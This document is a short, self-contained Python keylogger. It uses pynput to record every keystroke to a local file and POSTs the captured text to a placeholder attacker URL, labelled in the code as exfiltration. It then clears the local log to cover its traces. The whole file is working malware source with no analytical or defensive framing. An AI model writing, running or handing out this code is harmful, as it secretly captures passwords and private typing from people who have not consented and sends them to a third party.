from typing import List
from pynput.keyboard import Key, Listener
import requests 
import time

EXFILTRATION_URL = "http://your-attacker-server.com/upload-logs" 
LOG_FILE = "log.txt"

char_count = 0
saved_keys = []

def send_logs_to_server(log_content: str):
    print(f"\n[Exfiltrating Data - Size: {len(log_content)} bytes}}")
    payload = {
        'timestamp': time.strftime("%Y-%m-%d %H:%M:%S"),
        'data': log_content,
    }

    try:
        response = requests.post(EXFILTRATION_URL, json=payload, timeout=2) 

        if response.status_code == 200:
            print("[SUCCESS] Logs sent successfully.")
            # Clear the local log file if the transmission was successful
            with open(LOG_FILE, "w") as file:
                file.write("") 
        else:
            print(f"[FAIL] Server responded with status code: {response.status_code}")

    except requests.exceptions.RequestException as e:
        print(f"[ERROR] Could not connect to server: {e}")


def write_to_file(keys: List[str]):
    written_content = ""
    with open(LOG_FILE, "a") as file:
        for key in keys:
            key = str(key).replace("'", "")

            if "key".upper() not in key.upper():
                file.write(key)
                written_content += key

        file.write("\n")
        written_content += "\n"

    return written_content


def on_key_press(key):
    try:
        print("Key Pressed: ", key)
    except Exception as ex:
        print("There was an error: ", ex)

def on_key_release(key):
    global saved_keys, char_count

    if key == Key.esc:
        if saved_keys:
             content = write_to_file(saved_keys)
             send_logs_to_server(content)
        return False
    else:

        should_write_and_send = False

        if key == Key.enter:
            should_write_and_send = True
        elif key == Key.space:
            key = " "
            should_write_and_send = True


        if should_write_and_send:
            content = write_to_file(saved_keys)

            send_logs_to_server(content)

            char_count = 0
            saved_keys = []


        saved_keys.append(key)
        char_count += 1


with Listener(on_press=on_key_press, on_release=on_key_release) as listener:
    print("Start key logging...")
    listener.join(timeout=30) # Run for 30 seconds
    print("End key logging...")
